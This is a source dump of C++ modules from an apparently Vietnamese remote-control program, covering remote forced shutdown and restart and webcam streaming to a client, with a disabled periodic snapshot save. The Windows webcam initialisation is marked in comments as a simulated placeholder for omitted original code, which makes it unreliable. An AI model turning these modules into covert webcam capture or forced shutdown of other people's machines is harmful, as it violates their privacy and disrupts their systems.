    if (can_shutdown != 0) { // can't shutdown
        res["status"] = "error";
        res["error"] = "Can't shutdown";

        return res;
    }

    res["data"] = "Shutdown successfully";

    std::thread t(wrapper_shutdown);
    t.detach();

    return res;
}

json SystemManager::restart_system() const {
    int can_restart = system("systemctl --dry-run reboot > /dev/null 2>&1");
    json res = {
        {"status", "success"},
        {"module", get_module_name()},
        {"command", "RESTART"}
    };

    if (can_restart != 0) { // can't shutdown
        res["status"] = "error";
        res["error"] = "Can't restart";

        return res;
    }

    res["data"] = "Restart successfully";

    std::thread t(wrapper_restart);
    t.detach();

    return res;

}

json SystemManager::handle_command(const json& request) {
    const std::string command = request.value("command", "");

    if (command == "SHUTDOWN") {
        return shutdown_system();
    }

    else if (command == "RESTART")
        return restart_system();
    
    return {
        {"status", "error"},
        {"module", get_module_name()},
        {"error", "Unknown system command"}
    };
}



/* ===== FILE: ./src/modules/SystemManager_win.cpp ===== */

#include "SystemManager.hpp"

// Shutdown system
json SystemManager::shutdown_system() const {
    // Yeu cau tat may
    HANDLE hToken = nullptr; // Handle cho token, co tac dung cap quyen
    TOKEN_PRIVILEGES tkp{}; // Chua thong tin ve quyen 

    // Mo token cua quy trinh hien tai
    if (!OpenProcessToken(GetCurrentProcess(), 
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
                          &hToken)) 
    {
        return {
            {"status","error"},
            {"module", get_module_name()},
            {"message","OpenProcessToken failed"},
            {"last_error", static_cast<int>(GetLastError())}
        };
    }

    // Lay quyen shutdown
    LookupPrivilegeValue(nullptr, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1; // Mot quyen
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, nullptr, nullptr);

    // Thuc hien shutdown
    const BOOL res = ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE,
                                    SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);       
                                    const DWORD gle = res ? 0 : GetLastError();
                                    CloseHandle(hToken);
    if (!res) {
        return {
        {"status","error"},
        {"module", get_module_name()},
        {"message","ExitWindowsEx failed"},
        {"last_error", static_cast<int>(gle)}
        };
    }

    return {
        {"status","success"},
        {"module", get_module_name()},
        {"command","SHUTDOWN"},
        {"message", "System is shutting down"}
    };           
}

// Restart system

json SystemManager::restart_system() const {
    HANDLE hToken = nullptr;
    TOKEN_PRIVILEGES tkp{};

    // 1. Mở token của process
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken))
    {
        return {
            {"status","error"},
            {"module", get_module_name()},
            {"message","OpenProcessToken failed"},
            {"last_error", static_cast<int>(GetLastError())}
        };
    }

    // 2. Lấy quyền shutdown
    if (!LookupPrivilegeValue(nullptr, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
        DWORD gle = GetLastError();
        CloseHandle(hToken);
        return {
            {"status","error"},
            {"module", get_module_name()},
            {"message","LookupPrivilegeValue failed"},
            {"last_error", static_cast<int>(gle)}
        };
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // 3. Gán quyền vào token
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, nullptr, nullptr);
    DWORD adjustGLE = GetLastError();

    if (adjustGLE == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return {
            {"status","error"},
            {"module", get_module_name()},
            {"message","Privilege SE_SHUTDOWN_NAME not assigned"},
            {"last_error", static_cast<int>(adjustGLE)}
        };
    }

    // 4. Thực hiện restart
    const BOOL res = ExitWindowsEx(
        EWX_REBOOT | EWX_FORCE,
        SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER
    );

    DWORD gle = res ? 0 : GetLastError();
    CloseHandle(hToken);

    if (!res) {
        return {
            {"status","error"},
            {"module", get_module_name()},
            {"message","ExitWindowsEx failed"},
            {"last_error", static_cast<int>(gle)}
        };
    }

    return {
        {"status","success"},
        {"module", get_module_name()},
        {"command","RESTART"},
        {"message","System is restarting"}
    };
}

// DISPATCHER

json SystemManager::handle_command(const json& request) {
    const std::string command = request.value("command", "");

    if (command == "SHUTDOWN") {
        return shutdown_system();
    }
    if (command == "RESTART") {
        return restart_system();
    }
    
    return {
        {"status","error"},
        {"module", get_module_name()},
        {"message","Unknown SYSTEM command"},
        {"received_command", command}
    };
}



/* ===== FILE: ./src/modules/WebcamManager.hpp ===== */

#pragma once
#include "../interfaces/IRemoteModule.hpp"
#include <functional>
#include <atomic>
#include <vector>
#include <thread>
#include <iostream>
#include <vector>

#if _WIN32
#include <windows.h>
#include <objidl.h> 
#include <gdiplus.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#else
#endif

class WebcamManager : public IRemoteModule {
public:
    using StreamCallback = std::function<void(const std::vector<uint8_t>&)>;

    const std::string& get_module_name() const override {
        static const std::string name = "WEBCAM";
        return name;
    }

    // Hàm xử lý lệnh JSON (Start/Stop từ client)
    json handle_command(const json& request) override {
        // Chúng ta xử lý logic stream ở Main thông qua hàm start_stream bên dưới
        // Hàm này chỉ để giữ đúng interface
        return {{"status", "ok"}}; 
    }

    // Hàm bắt đầu luồng video
    void start_stream(StreamCallback callback);
    
    // Hàm dừng luồng
    void stop_stream();

private:
    std::atomic<bool> running_{false};
    std::thread stream_thread_;
};



/* ===== FILE: ./src/modules/WebcamManager_linux.cpp ===== */

#include "WebcamManager.hpp"
#include <iostream>
#include <cstdio>
#include <vector>
#include <algorithm> // std::search
#include <cstring>   // strerror
#include <cstdint>   // [FIX] Cần cho uint8_t

void WebcamManager::stop_stream() {
    running_ = false;
    if (stream_thread_.joinable()) {
        stream_thread_.join();
    }
}

void WebcamManager::start_stream(StreamCallback callback) {
    stop_stream();
    running_ = true;

    // VIẾT LOGIC FFMPEG TRONG LAMBDA (GIỐNG WINDOWS)
    stream_thread_ = std::thread([this, callback]() {
        const char* cmd = "ffmpeg -f v4l2 -framerate 25 -video_size 640x480 -i /dev/video0 -f image2pipe -vcodec mjpeg -q:v 10 pipe:1 2>/dev/null";
        FILE* pipe = popen(cmd, "r");
        
        if (!pipe) return;

        std::vector<uint8_t> buffer;
        std::vector<uint8_t> read_chunk(4096);
        const std::vector<uint8_t> jpeg_start = {0xFF, 0xD8};
        const std::vector<uint8_t> jpeg_end   = {0xFF, 0xD9};

        while (running_) {
            size_t bytes_read = fread(read_chunk.data(), 1, read_chunk.size(), pipe);
            if (bytes_read <= 0) break;

            buffer.insert(buffer.end(), read_chunk.begin(), read_chunk.begin() + bytes_read);

            while (true) {
                auto start_it = std::search(buffer.begin(), buffer.end(), jpeg_start.begin(), jpeg_start.end());
                if (start_it == buffer.end()) {
                    if (buffer.size() > 65536) buffer.clear();
                    break;
                }

                auto end_it = std::search(start_it, buffer.end(), jpeg_end.begin(), jpeg_end.end());
                if (end_it == buffer.end()) break;

                if (end_it + 2 > buffer.end()) break; // Safety check

                std::vector<uint8_t> jpg_frame(start_it, end_it + 2);
                
                // Gọi callback trực tiếp (không cần biến thành viên callback_)
                callback(jpg_frame);

                buffer.erase(buffer.begin(), end_it + 2);
            }
        }
        pclose(pipe);
    });
}





/* ===== FILE: ./src/modules/WebcamManager_win.cpp ===== */

#include "WebcamManager.hpp"
#include <fstream>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <direct.h> // _mkdir
#include <chrono>   // Để đo thời gian lưu file

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")

using namespace Gdiplus;

// --- HELPER: GDI+ Encoder (Static) ---
static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
UINT  num = 0; UINT  size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    auto pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// --- HELPER: GDI+ Init ---
struct GdiPlusInitWebcam {
    ULONG_PTR gdiplusToken;
    GdiPlusInitWebcam() { GdiplusStartupInput g; GdiplusStartup(&gdiplusToken, &g, NULL); }
    ~GdiPlusInitWebcam() { GdiplusShutdown(gdiplusToken); }
};
static GdiPlusInitWebcam init;

static void SaveWebcamFrame(const std::vector<uint8_t>& data) {
    _mkdir("captured_data");
    
    auto t = std::time(nullptr);
    auto tm = *std::localtime(&t);
    
    std::ostringstream oss;
    oss << "captured_data/cam_" << std::put_time(&tm, "%Y%m%d_%H%M%S") << ".jpg";
    std::string filename = oss.str();

    std::ofstream file(filename, std::ios::binary);
    if (file.is_open()) {
        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        file.close();
        std::cout << "[WEBCAM] Saved snapshot: " << filename << std::endl;
    }
}

void WebcamManager::stop_stream() {
    running_ = false;
    if (stream_thread_.joinable()) stream_thread_.join();
}

void WebcamManager::start_stream(StreamCallback callback) {
    stop_stream(); 
    running_ = true;

    stream_thread_ = std::thread([this, callback]() {
        HRESULT hr = S_OK;
        hr = MFStartup(MF_VERSION);
        if (FAILED(hr)) return;

        // ... (Giữ nguyên phần khởi tạo MFCreateAttributes, tìm thiết bị, tạo Reader như cũ) ...
        // ... (Để tiết kiệm không gian hiển thị, tôi không paste lại đoạn init dài dòng đó, 
        //      bạn hãy giữ nguyên đoạn code từ dòng 55 đến dòng 110 trong file gốc của bạn) ...
        
        // (Đây là đoạn code giả lập phần init webcam bạn đang có - HÃY GIỮ NGUYÊN CODE CŨ CỦA BẠN ĐẾN TRƯỚC VÒNG LẶP WHILE)
        IMFAttributes* pAttributes = NULL; IMFActivate** ppDevices = NULL; UINT32 count = 0;
        IMFMediaSource* pSource = NULL; IMFSourceReader* pReader = NULL;
        MFCreateAttributes(&pAttributes, 1);
        pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
        MFEnumDeviceSources(pAttributes, &ppDevices, &count);
        if (count > 0) ppDevices[0]->ActivateObject(IID_PPV_ARGS(&pSource));
        pAttributes->Release(); for(UINT32 i=0; i<count; i++) ppDevices[i]->Release(); CoTaskMemFree(ppDevices);
        if (!pSource) return;

        IMFAttributes* pReaderAttributes = NULL;
        MFCreateAttributes(&pReaderAttributes, 1);
        pReaderAttributes->SetUINT32(MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING, TRUE);
        MFCreateSourceReaderFromMediaSource(pSource, pReaderAttributes, &pReader);
        if(pReaderAttributes) pReaderAttributes->Release();

        IMFMediaType* pType = NULL; MFCreateMediaType(&pType);
        pType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        pType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB32);
        pReader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
        pType->Release();
        // (Kết thúc phần init giả lập)

        CLSID jpgClsid;
        GetEncoderClsid(L"image/jpeg", &jpgClsid);
        EncoderParameters encoderParameters;
        encoderParameters.Count = 1;
        encoderParameters.Parameter[0].Guid = EncoderQuality;
        encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
        encoderParameters.Parameter[0].NumberOfValues = 1;
        ULONG quality = 50; 
        encoderParameters.Parameter[0].Value = &quality;

        std::cout << "[WEBCAM] Streaming started...\n";

        // [MỚI] BIẾN ĐẾM THỜI GIAN ĐỂ LƯU FILE
        auto last_save_time = std::chrono::steady_clock::now();

        while (running_) {
            IMFSample* pSample = NULL;
            DWORD streamIndex, flags;
            LONGLONG llTimeStamp;

            hr = pReader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, &streamIndex, &flags, &llTimeStamp, &pSample);
            if (FAILED(hr)) break;

            if (pSample) {
                IMFMediaBuffer* pBuffer = NULL;
                pSample->ConvertToContiguousBuffer(&pBuffer);
                
                BYTE* pBitmapData = NULL;
                DWORD maxLength = 0, currentLength = 0;
                
                if (SUCCEEDED(pBuffer->Lock(&pBitmapData, &maxLength, &currentLength))) {
                    IMFMediaType* pCurrentType = NULL;
                    pReader->GetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pCurrentType);
                    UINT32 width = 0, height = 0;
                    MFGetAttributeSize(pCurrentType, MF_MT_FRAME_SIZE, &width, &height);
                    
                    Bitmap bmp(width, height, width * 4, PixelFormat32bppRGB, pBitmapData);
                    IStream* pStream = NULL;
                    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
                        if (bmp.Save(pStream, &jpgClsid, &encoderParameters) == Ok) {
                            STATSTG stg;
                            pStream->Stat(&stg, STATFLAG_NONAME);
                            ULONG sz = stg.cbSize.LowPart;
                            std::vector<uint8_t> jpgData(sz);
                            LARGE_INTEGER seekPos = {0};
                            pStream->Seek(seekPos, STREAM_SEEK_SET, NULL);
                            ULONG bytesRead;
                            pStream->Read(jpgData.data(), sz, &bytesRead);

                            // 1. Gửi về Client (như cũ)
                            if (callback) callback(jpgData);

                            // 2. [MỚI] Kiểm tra thời gian để lưu file (Mỗi 5 giây lưu 1 lần)
                            auto now = std::chrono::steady_clock::now();
                            if (std::chrono::duration_cast<std::chrono::seconds>(now - last_save_time).count() >= 5) {
                                // SaveWebcamFrame(jpgData);
                                last_save_time = now; // Cập nhật thời gian lưu cuối cùng
                            }
                        }
                        pStream->Release();
                    }
                    pCurrentType->Release();
                    pBuffer->Unlock();
                }
                pBuffer->Release();
                pSample->Release();
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(40));
        }

        if(pSource) pSource->Release();
        if(pReader) pReader->Release();
        MFShutdown();
    });
}
